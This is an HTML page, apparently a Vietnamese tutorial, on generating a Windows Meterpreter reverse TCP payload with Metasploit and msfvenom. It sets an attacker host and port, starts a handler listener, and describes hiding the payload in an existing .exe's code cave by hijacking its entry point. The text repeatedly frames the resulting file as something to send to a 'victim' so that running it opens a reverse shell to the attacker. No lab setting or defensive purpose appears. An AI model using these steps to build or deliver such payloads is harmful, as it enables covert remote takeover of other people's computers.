<html><head><style>/* Base styles */
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    line-height: 1.5;
    color: #ffffff;
    max-width: 980px;
    margin: 0 auto;
    padding: 2rem;
    background-color: #0d1117;
}

/* Typography */
h1 {
    font-size: 2rem;
    font-weight: 600;
    color: #ffffff;
    margin-bottom: 1.5rem;
    padding-bottom: 0.75rem;
    border-bottom: 1px solid #30363d;
}

h2 {
    font-size: 1.5rem;
    font-weight: 600;
    color: #ffffff;
    margin-top: 2rem;
    margin-bottom: 1rem;
    padding-bottom: 0.3rem;
    border-bottom: 1px solid #30363d;
}

h3 {
    font-size: 1.25rem;
    font-weight: 600;
    color: #ffffff;
    margin-top: 1.5rem;
    margin-bottom: 0.75rem;
}

p {
    margin-bottom: 1rem;
}

/* Code blocks */
pre {
    background-color: #161b22;
    color: #c9d1d9;
    padding: 1rem;
    border-radius: 6px;
    overflow-x: auto;
    margin: 1rem 0;
    border: 1px solid #30363d;
}

code {
    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
    font-size: 0.85rem;
}

/* Inline code */
p code, li code {
    background-color: #161b22;
    color: #c9d1d9;
    padding: 0.2rem 0.4rem;
    border-radius: 3px;
    font-size: 0.85em;
    border: 1px solid #30363d;
}

/* Lists */
ul, ol {
    margin-bottom: 1.5rem;
    padding-left: 2rem;
}

li {
    margin-bottom: 0.25rem;
}

/* Notes and warnings */
blockquote {
    background-color: #161b22;
    border-left: 4px solid #30363d;
    padding: 0.8rem 1rem;
    margin: 1rem 0;
    color: #c9d1d9;
}

strong {
    font-weight: 600;
    color: #ffffff;
}

/* Horizontal rules */
hr {
    border: 0;
    height: 1px;
    background-color: #30363d;
    margin: 2rem 0;
}

/* Command section styling */
.command-section {
    background-color: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 1rem;
    margin: 1.5rem 0;
}

/* Links */
a {
    color: #58a6ff;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

/* Tables */
table {
    border-collapse: collapse;
    width: 100%;
    margin: 1rem 0;
}

table th, table td {
    border: 1px solid #30363d;
    padding: 0.5rem 1rem;
    text-align: left;
}

table th {
    background-color: #161b22;
    font-weight: 600;
}

/* Responsive adjustments */
@media (max-width: 768px) {
    body {
        padding: 1rem;
    }
    
    h1 {
        font-size: 1.75rem;
    }
    
    h2 {
        font-size: 1.25rem;
    }
    
    h3 {
        font-size: 1.1rem;
    }
    
    pre {
        padding: 0.75rem;
    }
}

/* Print styles */
@media print {
    body {
        background: #0d1117;
        color: white;
        max-width: none;
        padding: 1cm;
    }
    
    pre, code {
        background-color: #161b22;
        color: #c9d1d9;
        border: 1px solid #30363d;
    }
    
    a {
        color: #58a6ff;
        text-decoration: underline;
    }
}</style></head><body><p>Để tạo payload bằng Metasploit (Metasploit Framework), bạn có thể sử dụng các module và lệnh được cung cấp trong Metasploit. Dưới đây là hướng dẫn cơ bản để tạo một payload sử dụng <strong>Metasploit</strong>:</p>
<h3 id="b-c-1-c-i-t-metasploit-framework">Bước 1: Cài đặt Metasploit Framework</h3>
<p>Trước tiên, nếu bạn chưa cài đặt Metasploit, hãy làm theo các bước sau:</p>
<ul>
<li>Trên <strong>Kali Linux</strong> (hoặc các bản phân phối khác dựa trên Debian), bạn có thể cài đặt Metasploit bằng lệnh:<pre><code class="lang-bash">sudo apt <span class="hljs-keyword">update</span>
sudo apt <span class="hljs-keyword">install</span> metasploit-framework
</code></pre>
</li>
<li><p>Trên <strong>Ubuntu</strong> : </p>
<pre><code class="lang-bash">sudo apt <span class="hljs-keyword">update</span>
ssudo snap <span class="hljs-keyword">install</span> metasploit-framework
</code></pre>
</li>
<li><p>Trên <strong>Windows</strong>, bạn có thể tải xuống bộ cài đặt Metasploit từ trang web chính thức của Metasploit: <a href="https://www.metasploit.com">https://www.metasploit.com</a>.</p>
</li>
</ul>
<h3 id="b-c-2-m-metasploit">Bước 2: Mở Metasploit</h3>
<p>Mở terminal và chạy lệnh sau để khởi động Metasploit:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">msfconsole</span>
</code></pre>
<h3 id="b-c-3-ch-n-v-c-u-h-nh-payload">Bước 3: Chọn và cấu hình Payload</h3>
<p>Metasploit cung cấp rất nhiều payloads để chọn. Dưới đây là ví dụ về cách tạo một payload đơn giản.</p>
<ol>
<li><p><strong>Chọn một payload</strong>:
Sử dụng lệnh <code>use</code> để chọn payload mong muốn. Ví dụ, nếu bạn muốn tạo một payload cho Windows, bạn có thể chọn một payload reverse TCP như sau:</p>
<pre><code class="lang-bash"><span class="hljs-keyword">use</span> windows/meterpreter/reverse_tcp
</code></pre>
</li>
<li><p><strong>Cấu hình các tùy chọn cho payload</strong>:
Sau khi chọn payload, bạn cần cấu hình các tùy chọn cần thiết. Bạn có thể kiểm tra các tùy chọn có sẵn bằng lệnh <code>show options</code>:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">show options</span>
</code></pre>
<p>Các tùy chọn cần thiết thường bao gồm:</p>
<ul>
<li><strong>LHOST</strong>: Địa chỉ IP của máy tấn công (máy sẽ nhận kết nối).</li>
<li><strong>LPORT</strong>: Cổng mà payload sẽ sử dụng để kết nối.</li>
</ul>
<p>Ví dụ, bạn có thể cấu hình các tùy chọn như sau:</p>
<pre><code class="lang-bash"><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">172.21</span><span class="hljs-number">.224</span><span class="hljs-number">.1</span>  <span class="hljs-comment"># Địa chỉ IP của máy tấn công</span>
<span class="hljs-keyword">set</span> LPORT <span class="hljs-number">4444</span>          <span class="hljs-comment"># Cổng mà payload sẽ sử dụng</span>
</code></pre>
</li>
</ol>
<h3 id="b-c-4-t-o-payload">Bước 4: Tạo Payload</h3>
<p>Khi bạn đã cấu hình đầy đủ payload, bạn có thể tạo nó. Dưới đây là hai cách để tạo payload:</p>
<ol>
<li><p><strong>Tạo payload dưới dạng một file để gửi cho nạn nhân</strong>:
Nếu bạn muốn tạo một payload và lưu nó vào một file để gửi cho nạn nhân (ví dụ như một file <code>.exe</code>), bạn có thể sử dụng lệnh <code>generate</code> hoặc <code>msfvenom</code>. Ví dụ:</p>
<pre><code class="lang-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST= <span class="hljs-number">172.21</span><span class="hljs-number">.224</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">4444</span> -f exe &gt; payload.exe
</code></pre>
<p>Lệnh này sẽ tạo một file <code>payload.exe</code>, mà bạn có thể gửi cho nạn nhân.</p>
</li>
<li><p><strong>Tạo một payload và gửi trực tiếp qua network</strong>:
Bạn có thể sử dụng Metasploit để tạo và quản lý payload trực tiếp qua mạng mà không cần tạo file. Ví dụ, sau khi cấu hình payload, bạn có thể tạo kết nối thông qua lệnh <code>exploit</code>:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">exploit</span>
</code></pre>
</li>
</ol>
<h3 id="b-c-5-ch-y-listener-listener-v-ch-k-t-n-i">Bước 5: Chạy Listener (Listener) và chờ kết nối</h3>
<p>Sau khi tạo payload và gửi nó tới nạn nhân (hoặc thử tấn công theo cách khác), bạn cần chạy listener để chờ kết nối từ payload. Ví dụ:</p>
<pre><code class="lang-bash">msfconsole
use exploit/multi/handler
<span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 172.21.224.1</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span>
exploit
</code></pre>
<p>Khi nạn nhân chạy payload (tệp <code>.exe</code> mà bạn đã tạo), một kết nối sẽ được thiết lập giữa máy của bạn và máy của nạn nhân, và bạn sẽ có quyền truy cập vào máy nạn nhân qua <strong>Meterpreter</strong>.</p>
<p><strong>HEX view của payload \n</strong></p>
<p><img src="image-4.png" alt="alt text"></p>
<p><strong>Chèn payload vào k gian trôgns của exe</strong></p>
<p><img src="image-3.png" alt="alt text"></p>
<p><strong>sửa entry point Jmp đến điểm bắt đầu của payload</strong> </p>
<p><img src="image-7.png" alt="alt text"></p>
<p><strong>Sử dụng Pushad và Pushfd đẻ lưu lại giá trị của các thanh ghi và flag</strong></p>
<p><img src="image-1.png" alt="alt text"></p>
<p><strong>Sử dụng Popad và Popfd đẻ khôi phục trạng thái thanh ghi ban đầu</strong> </p>
<p><strong>Phải trả lại entrypoint ban đâu đẻ trương trình chạy bình thường</strong></p>
<p><img src="image-6.png" alt="alt text"></p>
<p><strong>Khi người dùng run Payload này chẽ mở 1 reverse Shell đến máy của kẻ tấn công</strong> </p>
<p><img src="image-5.png" alt="alt text"></p>
</body></html>